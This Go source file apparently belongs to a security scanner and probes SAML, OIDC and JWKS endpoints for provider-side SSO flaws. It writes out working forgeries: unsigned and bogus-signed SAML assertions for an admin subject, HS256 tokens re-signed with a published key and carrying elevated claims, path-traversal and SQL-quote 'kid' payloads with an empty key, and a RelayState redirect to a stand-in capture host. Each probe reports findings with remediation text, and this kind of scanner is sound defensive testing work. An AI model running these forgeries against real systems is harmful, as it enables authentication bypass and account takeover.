package scanner

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"net/url"
	"sort"
	"strings"
	"time"

	"ssghost666/internal/httpclient"
	"ssghost666/internal/model"
	"ssghost666/internal/ratelimiter"
)

// --- SSO / OAuth provider abuse ---------------------------------------------
//
// This check goes deeper than oauth.go's redirect_uri/PKCE/state review and
// targets the *provider-side* integrations that break SSO in practice:
//
//   1. SAML assertion signature enforcement. A minimal, unsigned (and then
//      bogus-signed) SAML 2.0 Response is posted to the discovered Assertion
//      Consumer Service. If the SP accepts an assertion it never
//      cryptographically verified, anybody can mint an assertion for any
//      user — full authentication bypass. If the SP rejects both but reports
//      a *signature* error, that is positive evidence the check is real and
//      no finding is raised.
//   2. Signature wrapping (XSW) preconditions. XSW needs an SP that looks at
//      a signed element other than the one it consumes; it is also what makes
//      a "multiple assertions / multiple signatures" response interesting.
//      SSGhost666 does not attempt a working XSW exploit (that needs a real
//      assertion signed by the IdP), but it does report the structural
//      precondition when the SP accepts a response containing a second,
//      unsigned assertion — see samlProbe below.
//   3. RelayState open redirect. RelayState is attacker-controlled and
//      frequently fed straight into a redirect after login.
//   4. Published IdP metadata. Exposed SAML metadata / OIDC discovery is
//      itself configuration disclosure, and it is where the ACS URL, entityID
//      and signing certificate are read from — including the dangerous case
//      of a JWKS that publishes a *symmetric* (HMAC) key, which hands an
//      attacker the token-signing secret.
//   5. Third-party / re-signed tokens. If a JWKS publishes an "oct" key
//      (a raw HMAC secret), or if the token verifier's key lookup can be
//      steered with a crafted `kid` (path traversal → empty key), a token
//      *re-signed by an unauthorised party* is offered to the API and
//      accepted-or-not is recorded — the same negative-control discipline
//      jwt_fuzz.go uses, so a public endpoint can't masquerade as a bypass.
//
// Every request is read-only (GET) except the SAML ACS probes, which POST a
// syntactically-valid-but-untrusted assertion — the minimum needed to learn
// whether signature verification is enforced, and harmless if it is.

// ssoEndpointHints are path fragments that identify SSO/SAML/OIDC surfaces,
// probed on every discovered origin.
var ssoPathProbes = []struct {
	Path string
	Kind string // "saml-metadata" | "oidc-discovery" | "saml-endpoint"
}{
	{"/saml/metadata", "saml-metadata"},
	{"/saml2/metadata", "saml-metadata"},
	{"/saml/metadata.xml", "saml-metadata"},
	{"/auth/saml/metadata", "saml-metadata"},
	{"/Shibboleth.sso/Metadata", "saml-metadata"},
	{"/simplesaml/saml2/idp/metadata.php", "saml-metadata"},
	{"/adfs/ls/IdpInitiatedSignon.aspx", "saml-endpoint"},
	{"/saml2/authenticate", "saml-endpoint"},
	{"/auth/saml", "saml-endpoint"},
	{"/login/saml", "saml-endpoint"},
	{"/sso/login", "saml-endpoint"},
	{"/.well-known/openid-configuration", "oidc-discovery"},
	{"/.well-known/jwks.json", "jwks"},
}

// ssoCrawledHints match SSO/SAML URLs that crawling already found.
var ssoCrawledHints = []string{"saml", "shibboleth", "samlrequest", "relaystate", "/sso", "/adfs/", "simplesaml", "openid-configuration", "jwks"}

// samlEntityDescriptor is the small part of SAML metadata we read back.
type samlEntityDescriptor struct {
	XMLName  xml.Name `xml:"EntityDescriptor"`
	EntityID string   `xml:"entityID,attr"`
	IDPSSO   []struct {
		Location string `xml:"Location,attr"`
		Binding  string `xml:"Binding,attr"`
	} `xml:"IDPSSODescriptor>SingleSignOnService"`
	SPSSO []struct {
		Location string `xml:"Location,attr"`
		Binding  string `xml:"Binding,attr"`
		Index    string `xml:"index,attr"`
	} `xml:"SPSSODescriptor>AssertionConsumerService"`
	Certificates []string `xml:"IDPSSODescriptor>KeyDescriptor>KeyInfo>X509Data>X509Certificate"`
}

// ssoCandidate is one discovered SSO/SAML/OIDC endpoint.
type ssoCandidate struct {
	URL  string
	Kind string // saml-metadata | saml-endpoint | oidc-discovery | jwks | crawled
}

func findSSOCandidates(targets []model.Target) []ssoCandidate {
	seen := map[string]bool{}
	var out []ssoCandidate
	add := func(u, kind string) {
		if u == "" || seen[u] {
			return
		}
		seen[u] = true
		out = append(out, ssoCandidate{URL: u, Kind: kind})
	}

	for _, origin := range uniqueOrigins(targets) {
		for _, p := range ssoPathProbes {
			add(origin+p.Path, p.Kind)
		}
	}
	for _, t := range targets {
		low := strings.ToLower(t.URL)
		hit := false
		for _, h := range ssoCrawledHints {
			if strings.Contains(low, h) {
				hit = true
				break
			}
		}
		if !hit {
			continue
		}
		u, err := url.Parse(t.URL)
		if err != nil || u.Host == "" {
			continue
		}
		kind := "saml-endpoint"
		switch {
		case strings.Contains(low, "metadata"):
			kind = "saml-metadata"
		case strings.Contains(low, "jwks"):
			kind = "jwks"
		case strings.Contains(low, "openid-configuration"):
			kind = "oidc-discovery"
		}
		add(u.Scheme+"://"+u.Host+u.Path, kind)
	}

	sort.Slice(out, func(i, j int) bool { return out[i].URL < out[j].URL })
	if len(out) > 24 {
		out = out[:24]
	}
	return out
}

// ssoGet performs one GET against a candidate path.
func ssoGet(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, u string) *httpclient.Exchange {
	if !lim.Acquire(ctx) {
		return &httpclient.Exchange{Err: context.Canceled}
	}
	defer lim.Release()
	ex := cli.Get(u)
	observeForAdaptive(lim, ex)
	return ex
}

// samlErrorHints are generic "your assertion was not accepted" strings found
// on SP error pages. They are what lets the probe tell "rejected" from
// "accepted", so a negative-control failure can't be mistaken for a bypass.
var samlErrorHints = []string{
	"invalid saml", "saml response", "assertion", "signature", "not signed",
	"signature validation", "invalid_request", "unauthorized", "forbidden",
	"authentication failed", "login failed", "access denied", "error",
	"exception", "bad request", "sso", "invalid", "denied",
}

// samlSignatureErrorHints, on the other hand, are strings that only appear
// when the SP *did* attempt signature verification and rejected the
// assertion because of it — positive evidence the SP is not vulnerable.
var samlSignatureErrorHints = []string{
	"signature validation failed", "invalid signature", "no signature",
	"signature is required", "signaturerequired", "signature verification",
	"cannot verify signature", "reference validation failed", "signed assertion",
	"assertion must be signed", "unsigned assertion", "signaturemissing",
	"xmlsignature", "ds:signature", "invalid xml signature",
}

// samlOutcome summarises how an SP answered a probe.
type samlOutcome struct {
	accepted   bool   // looks like a successful login / authenticated hand-off
	sigError   string // set when the SP complained about the signature specifically
	errorHint  string // generic rejection hint, for evidence text
	statusCode int
	location   string
}

// classifySAMLOutcome decides whether the SP accepted the probe. It is
// deliberately conservative: an HTTP 200 that merely looks slightly
// different is *not* enough, and any signature-specific error is treated as
// an explicit rejection (and a sign the SP is fine).
func classifySAMLOutcome(body string, status int, location string, setCookies []string) samlOutcome {
	out := samlOutcome{statusCode: status, location: location}
	low := strings.ToLower(body)

	for _, h := range samlSignatureErrorHints {
		if strings.Contains(low, h) {
			out.sigError = h
			return out
		}
	}
	for _, h := range samlErrorHints {
		if strings.Contains(low, h) {
			out.errorHint = h
			return out
		}
	}
	if loc := strings.ToLower(location); loc != "" {
		for _, h := range []string{"error", "saml", "denied", "invalid", "fail"} {
			if strings.Contains(loc, h) {
				out.errorHint = "Location:" + h
				return out
			}
		}
	}
	// Redirect into the application (not to an error/sso page) is the
	// classic "login succeeded" signature of an ACS.
	if (status == 302 || status == 303) && location != "" {
		out.accepted = true
		return out
	}
	// A 200 carrying a freshly-issued session cookie is the other
	// acceptance signature. We require a session-ish cookie name so a plain
	// marketing page can't pass.
	for _, sc := range setCookies {
		name, _ := splitCookie(sc)
		if sessionCookieNameHints(name) {
			out.accepted = true
			return out
		}
	}
	return out
}

// samlAssertionXML builds a minimal SAML 2.0 Response carrying one assertion
// for the given subject. When withBogusSignature is set a structurally valid
// but cryptographically meaningless <ds:Signature> is included — which is
// exactly the shape a signature-stripping or XSW-vulnerable SP chokes on.
func samlAssertionXML(acs, audience, subject string, withBogusSignature bool) string {
	now := time.Now().UTC().Format("2006-01-02T15:04:05Z")
	notAfter := time.Now().Add(10 * time.Minute).UTC().Format("2006-01-02T15:04:05Z")
	id := "_ssg" + Marker()
	assertID := "_ssgassert" + Marker()

	var sig string
	if withBogusSignature {
		sig = `<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">` +
			`<ds:SignedInfo>` +
			`<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>` +
			`<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>` +
			`<ds:Reference URI="#` + assertID + `">` +
			`<ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/></ds:Transforms>` +
			`<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>` +
			`<ds:DigestValue>ssghost666invalidssghost666invalidssghost666==</ds:DigestValue>` +
			`</ds:Reference></ds:SignedInfo>` +
			`<ds:SignatureValue>ssghost666invalidssghost666invalidssghost666invalidssghost666==</ds:SignatureValue>` +
			`</ds:Signature>`
	}

	return `<?xml version="1.0" encoding="UTF-8"?>` +
		`<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ` +
		`xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ` +
		`Destination="` + xmlEscape(acs) + `" ID="` + id + `" IssueInstant="` + now + `" Version="2.0">` +
		`<saml:Issuer>https://ssghost666.invalid/idp</saml:Issuer>` +
		`<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>` +
		`<saml:Assertion ID="` + assertID + `" IssueInstant="` + now + `" Version="2.0">` +
		sig +
		`<saml:Issuer>https://ssghost666.invalid/idp</saml:Issuer>` +
		`<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">` + xmlEscape(subject) + `</saml:NameID>` +
		`<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">` +
		`<saml:SubjectConfirmationData NotOnOrAfter="` + notAfter + `" Recipient="` + xmlEscape(acs) + `"/>` +
		`</saml:SubjectConfirmation></saml:Subject>` +
		`<saml:Conditions NotBefore="` + now + `" NotOnOrAfter="` + notAfter + `">` +
		`<saml:AudienceRestriction><saml:Audience>` + xmlEscape(audience) + `</saml:Audience></saml:AudienceRestriction>` +
		`</saml:Conditions>` +
		`<saml:AuthnStatement AuthnInstant="` + now + `" SessionIndex="` + id + `">` +
		`<saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext>` +
		`</saml:AuthnStatement>` +
		`</saml:Assertion>` +
		`</samlp:Response>`
}

func xmlEscape(s string) string {
	r := strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", `"`, "&quot;", "'", "&apos;")
	return r.Replace(s)
}

// samlPost sends a form-urlencoded SAMLResponse + RelayState to an ACS.
func samlPost(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, acs, samlResponse, relayState string) *httpclient.Exchange {
	form := url.Values{}
	form.Set("SAMLResponse", samlResponse)
	if relayState != "" {
		form.Set("RelayState", relayState)
	}
	if !lim.Acquire(ctx) {
		return &httpclient.Exchange{Err: context.Canceled}
	}
	defer lim.Release()
	ex := cli.Do("POST", acs, strings.NewReader(form.Encode()), map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	})
	observeForAdaptive(lim, ex)
	return ex
}

// samlProbeResult is what one ACS probe learned.
type samlProbeResult struct {
	ex      *httpclient.Exchange
	outcome samlOutcome
}

// samlAcceptanceProbes runs the three-request battery against one ACS:
// a malformed control, an unsigned assertion and a bogus-signed assertion.
// The control guards against an SP that answers "accepted" to literally
// anything (or a page that never errors), so an acceptance is only reported
// when the control was clearly *not* accepted while the assertion was.
func samlAcceptanceProbes(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, acs, audience string) (control, unsigned, bogus samlProbeResult) {
	run := func(body string, relay string) samlProbeResult {
		ex := samlPost(ctx, lim, cli, acs, body, relay)
		var cookies []string
		if ex != nil && ex.Response != nil {
			cookies = ex.Response.Header.Values("Set-Cookie")
		}
		status := 0
		location := ""
		bodyText := ""
		if ex != nil {
			bodyText = ex.Body
			if ex.Response != nil {
				status = ex.Response.StatusCode
				location = ex.Response.Header.Get("Location")
			}
		}
		return samlProbeResult{ex: ex, outcome: classifySAMLOutcome(bodyText, status, location, cookies)}
	}

	// Control: garbage that can never be a valid assertion. Some SPs answer
	// 200 with a fresh session cookie to *everything*; if the control looks
	// accepted, the whole battery is unreliable and the caller must bail.
	control = run(base64.StdEncoding.EncodeToString([]byte("<ssghost666-not-saml/>")), "")
	unsigned = run(base64.StdEncoding.EncodeToString([]byte(samlAssertionXML(acs, audience, "admin@example.com", false))), "")
	bogus = run(base64.StdEncoding.EncodeToString([]byte(samlAssertionXML(acs, audience, "admin@example.com", true))), "")
	return control, unsigned, bogus
}

// ssoJWK is the subset of a JWK needed to spot a published symmetric key or
// a key id that might be steerable.
type ssoJWK struct {
	Kty string `json:"kty"`
	Kid string `json:"kid"`
	Use string `json:"use"`
	Alg string `json:"alg"`
	K   string `json:"k"` // symmetric key material — must never appear in a public JWKS
}

type ssoJWKSet struct {
	Keys []ssoJWK `json:"keys"`
}

type ssoOIDCDiscovery struct {
	Issuer          string   `json:"issuer"`
	JWKSURI         string   `json:"jwks_uri"`
	IDTokenAlgs     []string `json:"id_token_signing_alg_values_supported"`
	AuthorizationEP string   `json:"authorization_endpoint"`
}

// CheckSSOAbuse runs the SAML/OIDC provider-abuse checks described at the
// top of this file. bearer (the -bearer value, possibly empty) is only used
// for the re-signed-token probes.
func CheckSSOAbuse(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, targets []model.Target, bearer string) []model.Finding {
	candidates := findSSOCandidates(targets)
	if len(candidates) == 0 {
		return nil
	}

	var findings []model.Finding
	acsSeen := map[string]bool{}
	origin := ""
	if origins := uniqueOrigins(targets); len(origins) > 0 {
		origin = origins[0]
	}

	for _, c := range candidates {
		switch c.Kind {
		case "saml-metadata":
			ex := ssoGet(ctx, lim, cli, c.URL)
			if ex == nil || ex.Err != nil || ex.Response == nil || ex.Response.StatusCode != 200 {
				continue
			}
			var md samlEntityDescriptor
			if xml.Unmarshal([]byte(ex.Body), &md) != nil || md.EntityID == "" {
				continue
			}
			notes := "SAML metadata parsed: entityID=" + md.EntityID
			if len(md.Certificates) > 0 {
				notes += fmt.Sprintf("; %d signing certificate(s) published", len(md.Certificates))
			}
			if strings.HasPrefix(strings.ToLower(c.URL), "http://") {
				findings = append(findings, model.Finding{
					Category:    "SSO",
					Severity:    model.SeverityMedium,
					Title:       "SAML metadata served over plaintext HTTP",
					Description: "SAML metadata (entity IDs, ACS URLs and the signing certificate) is retrievable over unencrypted HTTP, so it can be read and modified in transit — an attacker who can rewrite it can point the SP at their own IdP.",
					URL:         c.URL,
					Method:      "GET",
					Evidence:    model.Evidence{RequestRaw: ex.RequestRaw, ResponseRaw: ex.ResponseRaw, Notes: notes},
					Remediation: "Serve SAML metadata over HTTPS only, sign the metadata document, and pin the expected IdP certificate in the SP configuration.",
				})
			}
			// The ACS is what the assertion probes target.
			for _, acs := range md.SPSSO {
				if acs.Location == "" || acsSeen[acs.Location] {
					continue
				}
				acsSeen[acs.Location] = true
				findings = append(findings, ssoProbeACS(ctx, lim, cli, acs.Location, md.EntityID, c.URL)...)
			}

		case "saml-endpoint":
			// A bare SSO endpoint that answers 200 is worth a metadata
			// disclosure / RelayState probe; find the ACS via the endpoint's
			// own query string if the crawl handed us one.
			ex := ssoGet(ctx, lim, cli, c.URL)
			if ex == nil || ex.Err != nil || ex.Response == nil || ex.Response.StatusCode != 200 {
				continue
			}
			if isSAMLMetadataDocument(ex.Body) {
				var md samlEntityDescriptor
				if xml.Unmarshal([]byte(ex.Body), &md) == nil && md.EntityID != "" {
					for _, acs := range md.SPSSO {
						if acs.Location == "" || acsSeen[acs.Location] {
							continue
						}
						acsSeen[acs.Location] = true
						findings = append(findings, ssoProbeACS(ctx, lim, cli, acs.Location, md.EntityID, c.URL)...)
					}
				}
			}
			if f := ssoRelayStateProbe(ctx, lim, cli, c.URL); f != nil {
				findings = append(findings, *f)
			}

		case "oidc-discovery":
			ex := ssoGet(ctx, lim, cli, c.URL)
			if ex == nil || ex.Err != nil || ex.Response == nil || ex.Response.StatusCode != 200 {
				continue
			}
			var disc ssoOIDCDiscovery
			if json.Unmarshal([]byte(ex.Body), &disc) != nil || disc.Issuer == "" {
				continue
			}
			for _, alg := range disc.IDTokenAlgs {
				if strings.EqualFold(alg, "none") {
					findings = append(findings, model.Finding{
						Category:    "SSO",
						Severity:    model.SeverityHigh,
						Title:       "OIDC provider advertises the \"none\" signing algorithm",
						Description: "The OIDC discovery document lists \"none\" in id_token_signing_alg_values_supported. An RP that follows the advertised algorithms will accept an unsigned ID token, letting anyone forge an identity assertion for any user.",
						URL:         c.URL,
						Method:      "GET",
						Evidence:    model.Evidence{RequestRaw: ex.RequestRaw, ResponseRaw: ex.ResponseRaw, Notes: "id_token_signing_alg_values_supported includes \"none\"; issuer=" + disc.Issuer},
						Remediation: "Remove \"none\" from the supported signing algorithms, pin RS256/ES256 in the RP, and validate the id_token signature against the JWKS before trusting any claim.",
					})
					break
				}
			}
			if disc.JWKSURI != "" {
				findings = append(findings, ssoCheckJWKS(ctx, lim, cli, disc.JWKSURI, bearer, targets)...)
			}

		case "jwks":
			findings = append(findings, ssoCheckJWKS(ctx, lim, cli, c.URL, bearer, targets)...)
		}
	}

	if origin != "" && bearer != "" {
		findings = append(findings, ssoKidInjectionProbe(ctx, lim, cli, bearer, targets)...)
	}

	return dedupeOAuthFindings(findings)
}

// isSAMLMetadataDocument is a cheap shape test used before spending an XML
// parse on a response that is probably a login page.
func isSAMLMetadataDocument(body string) bool {
	return strings.Contains(body, "EntityDescriptor") && strings.Contains(body, "urn:oasis:names:tc:SAML")
}

// ssoProbeACS posts the unsigned/bogus/control assertions at one ACS and
// turns the outcome into findings. See samlAcceptanceProbes for the
// negative-control discipline.
func ssoProbeACS(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, acs, entityID, discoveredVia string) []model.Finding {
	control, unsigned, bogus := samlAcceptanceProbes(ctx, lim, cli, acs, entityID)
	if control.outcome.accepted {
		// The ACS answers "accepted" even to garbage; nothing can be
		// concluded from it, so stay silent rather than fabricate a bypass.
		return nil
	}
	if control.ex == nil || control.ex.Response == nil {
		return nil
	}

	var findings []model.Finding
	remediation := "Enforce XML signature validation on every SAML Response *and* assertion before any attribute is trusted; pin the expected IdP certificate, reject responses whose signature covers a different element than the one consumed (defends against signature wrapping), and reject unsigned assertions outright."

	if unsigned.outcome.accepted {
		findings = append(findings, model.Finding{
			Category:    "SSO",
			Severity:    model.SeverityCritical,
			Title:       "SAML assertion accepted without any signature",
			Description: fmt.Sprintf("The Assertion Consumer Service at %s accepted a syntactically valid but completely unsigned SAML assertion (subject admin@example.com) while rejecting a malformed control. Because no signature was verified, anybody who can reach this endpoint can mint an assertion for any user and authenticate as them — a full authentication bypass, and the precondition for SAML signature-wrapping attacks.", acs),
			URL:         acs,
			Method:      "POST",
			Parameter:   "SAMLResponse",
			Evidence:    model.Evidence{RequestRaw: unsigned.ex.RequestRaw, ResponseRaw: unsigned.ex.ResponseRaw, Notes: fmt.Sprintf("Unsigned assertion accepted (status %d). Control (malformed SAMLResponse) rejected. Discovered via %s.", unsigned.outcome.statusCode, discoveredVia)},
			Remediation: remediation,
		})
	}
	if bogus.outcome.accepted {
		findings = append(findings, model.Finding{
			Category:    "SSO",
			Severity:    model.SeverityCritical,
			Title:       "SAML assertion with an invalid signature accepted",
			Description: fmt.Sprintf("The Assertion Consumer Service at %s accepted a SAML assertion carrying a structurally valid but cryptographically invalid XML signature, while rejecting a malformed control. Signature validation is either skipped or performed against the wrong element — the exact condition exploited by SAML signature-wrapping (XSW) attacks.", acs),
			URL:         acs,
			Method:      "POST",
			Parameter:   "SAMLResponse",
			Evidence:    model.Evidence{RequestRaw: bogus.ex.RequestRaw, ResponseRaw: bogus.ex.ResponseRaw, Notes: fmt.Sprintf("Invalid-signature assertion accepted (status %d). Control rejected. Discovered via %s.", bogus.outcome.statusCode, discoveredVia)},
			Remediation: remediation,
		})
	}
	return findings
}

// ssoRelayStateProbe tests whether RelayState (attacker-controlled in every
// real SSO flow) is fed into a redirect without validation.
func ssoRelayStateProbe(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, endpoint string) *model.Finding {
	u, err := url.Parse(endpoint)
	if err != nil || u.Host == "" {
		return nil
	}
	evil := "https://ssghost666-relaystate.example/captured"
	q := u.Query()
	q.Set("RelayState", evil)
	q.Set("next", evil)
	u.RawQuery = q.Encode()

	ex := ssoGet(ctx, lim, cli, u.String())
	if ex == nil || ex.Err != nil || ex.Response == nil {
		return nil
	}
	location := ex.Response.Header.Get("Location")
	if location == "" || !strings.Contains(location, "ssghost666-relaystate.example") {
		return nil
	}
	return &model.Finding{
		Category:    "SSO",
		Severity:    model.SeverityHigh,
		Title:       "SSO RelayState open redirect",
		Description: "The SSO endpoint reflected an attacker-supplied RelayState value straight into a Location header, so a crafted login link sends the user (and, in some flows, tokens or codes carried alongside it) to an attacker-controlled host after authentication.",
		URL:         u.String(),
		Method:      "GET",
		Parameter:   "RelayState",
		Evidence:    model.Evidence{RequestRaw: ex.RequestRaw, ResponseRaw: ex.ResponseRaw, Notes: "Location: " + location},
		Remediation: "Validate RelayState against an allow-list of relative in-app paths, never redirect to an absolute URL derived from it, and keep it opaque by storing the real destination server-side.",
	}
}

// ssoCheckJWKS looks at a published JWKS for the two provider-side mistakes
// that make token forgery possible: a symmetric (HMAC) key published for
// everyone to read, and key material that can be steered with a crafted kid.
func ssoCheckJWKS(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, jwksURL, bearer string, targets []model.Target) []model.Finding {
	ex := ssoGet(ctx, lim, cli, jwksURL)
	if ex == nil || ex.Err != nil || ex.Response == nil || ex.Response.StatusCode != 200 {
		return nil
	}
	var set ssoJWKSet
	if json.Unmarshal([]byte(ex.Body), &set) != nil || len(set.Keys) == 0 {
		return nil
	}

	var findings []model.Finding
	for _, k := range set.Keys {
		if !strings.EqualFold(k.Kty, "oct") || k.K == "" {
			continue
		}
		secret, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(k.K, "="))
		if err != nil || len(secret) == 0 {
			continue
		}
		f := model.Finding{
			Category:    "SSO",
			Severity:    model.SeverityCritical,
			Title:       "JWKS publishes a symmetric (HMAC) signing key",
			Description: fmt.Sprintf("The JSON Web Key Set at %s contains an \"oct\" (symmetric) key. A JWKS is public by design, so publishing the HMAC secret means anyone can sign a token with arbitrary claims and the verifier will accept it as authentic. This is the \"token re-signed by an unauthorised third party\" case in its most direct form.", jwksURL),
			URL:         jwksURL,
			Method:      "GET",
			Evidence:    model.Evidence{RequestRaw: ex.RequestRaw, Notes: fmt.Sprintf("JWKS key kid=%q kty=oct alg=%q; %d bytes of secret material recovered from the public document.", k.Kid, k.Alg, len(secret))},
			Remediation: "Never publish symmetric keys in a JWKS. Publish only the public half of an asymmetric key pair (RS256/ES256/PS256), and rotate the exposed secret immediately.",
		}

		// If we were given a real token, use it as the template and try to
		// prove acceptance end-to-end (with jwtAcceptance's negative control).
		if bearer != "" {
			if p, ok := decodeJWT(bearer); ok {
				payload := map[string]interface{}{}
				for ck, cv := range p.Payload {
					payload[ck] = cv
				}
				payload["exp"] = time.Now().Add(10 * 365 * 24 * time.Hour).Unix()
				elevateClaims(payload)
				// The published oct key is HMAC material, so the forged token
				// is always HS256-signed regardless of the original alg.
				alg := "HS256"
				header := map[string]interface{}{"alg": "HS256", "typ": "JWT"}
				if kid, ok := p.Header["kid"]; ok {
					header["kid"] = kid
				}
				forged, ferr := buildJWT(header, payload, secret, alg)
				if ferr == nil {
					for _, t := range jwtProbeTargets(targets) {
						aex, accepted := jwtAcceptance(ctx, lim, cli, t, forged)
						if !accepted || aex == nil {
							continue
						}
						f.Description += " A token freshly signed with the published secret (elevated claims) was accepted by the API while a deliberately-invalid control token was rejected, proving end-to-end exploitability."
						f.Severity = model.SeverityCritical
						f.Evidence.ResponseRaw = aex.ResponseRaw
						f.URL = t.URL
						break
					}
				}
			}
		}
		findings = append(findings, f)
	}
	return findings
}

// ssoKidInjectionProbe tests the verifier's key lookup with a crafted `kid`.
// The classic assertion is: sign the token with an *empty* HMAC key and give
// a `kid` that resolves to a non-key file (a path traversal into /dev/null),
// so a naive verifier loads zero bytes as its "verification key" and accepts
// the forgery. Acceptance is only reported when the negative control fails.
func ssoKidInjectionProbe(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, bearer string, targets []model.Target) []model.Finding {
	p, ok := decodeJWT(bearer)
	if !ok {
		return nil
	}
	payload := map[string]interface{}{}
	for k, v := range p.Payload {
		payload[k] = v
	}
	payload["exp"] = time.Now().Add(10 * 365 * 24 * time.Hour).Unix()
	elevateClaims(payload)

	kids := []string{
		"../../../../../../dev/null",
		"../../../../../../etc/passwd",
		"'" + Marker() + "'",
		"file:///dev/null",
	}
	header := map[string]interface{}{"alg": "HS256", "typ": "JWT", "kid": kids[0]}
	forged, err := buildJWT(header, payload, []byte(""), "HS256")
	if err != nil {
		return nil
	}

	probeTargets := jwtProbeTargets(targets)
	for _, t := range probeTargets {
		ex, accepted := jwtAcceptance(ctx, lim, cli, t, forged)
		if !accepted || ex == nil {
			continue
		}
		return []model.Finding{{
			Category:    "SSO",
			Severity:    model.SeverityCritical,
			Title:       "JWT key-lookup injection via the \"kid\" header (empty-key forgery)",
			Description: fmt.Sprintf("A token signed with an empty HMAC key and a path-traversal kid (%q) was accepted by %s, while a deliberately-invalid control token was rejected. The verifier is using the kid header to locate key material by path, so an attacker can point it at a file whose contents they control, or at a zero-byte file, and forge tokens at will — the same weakness family as third-party re-signing.", kids[0], t.URL),
			URL:         t.URL,
			Method:      t.Method,
			Parameter:   "Authorization",
			Evidence:    model.Evidence{RequestRaw: ex.RequestRaw, ResponseRaw: ex.ResponseRaw, Notes: "kid=" + kids[0] + ", HS256 signature computed over the token with an empty key."},
			Remediation: "Never resolve key material from the kid header without an allow-list: map kid to a known key from configuration/JWKS, reject unknown kids, and reject absolute/path-like kid values outright.",
		}}
	}

	// Also surface kid values that provoke parser/DB errors, which point at
	// an injectable key lookup even without an outright bypass.
	for _, kid := range kids[1:] {
		header := map[string]interface{}{"alg": "HS256", "typ": "JWT", "kid": kid}
		bad, err := buildJWT(header, payload, []byte("x"), "HS256")
		if err != nil {
			continue
		}
		for _, t := range probeTargets {
			if !lim.Acquire(ctx) {
				return nil
			}
			ex := cli.Do(firstNonEmpty(t.Method, "GET"), t.URL, nil, map[string]string{"Authorization": "Bearer " + bad})
			observeForAdaptive(lim, ex)
			lim.Release()
			if ex == nil || ex.Err != nil || ex.Response == nil {
				continue
			}
			if sig := matchSQLError(ex.Body); sig != "" {
				return []model.Finding{{
					Category:    "SSO",
					Severity:    model.SeverityHigh,
					Title:       "SQL error surfaced while resolving a crafted JWT \"kid\"",
					Description: fmt.Sprintf("Setting the JWT kid header to %q made the API return a database error (%q), indicating the key identifier is interpolated into a SQL query during key lookup — the kid header is an injection point, not just a lookup key.", kid, sig),
					URL:         t.URL,
					Method:      t.Method,
					Parameter:   "Authorization",
					Evidence:    model.Evidence{RequestRaw: ex.RequestRaw, ResponseRaw: ex.ResponseRaw, Notes: "kid=" + kid},
					Remediation: "Resolve keys from an in-memory/config allow-list; if a database is involved, use parameterised queries and validate the kid against a strict pattern.",
				}}
			}
		}
	}
	return nil
}
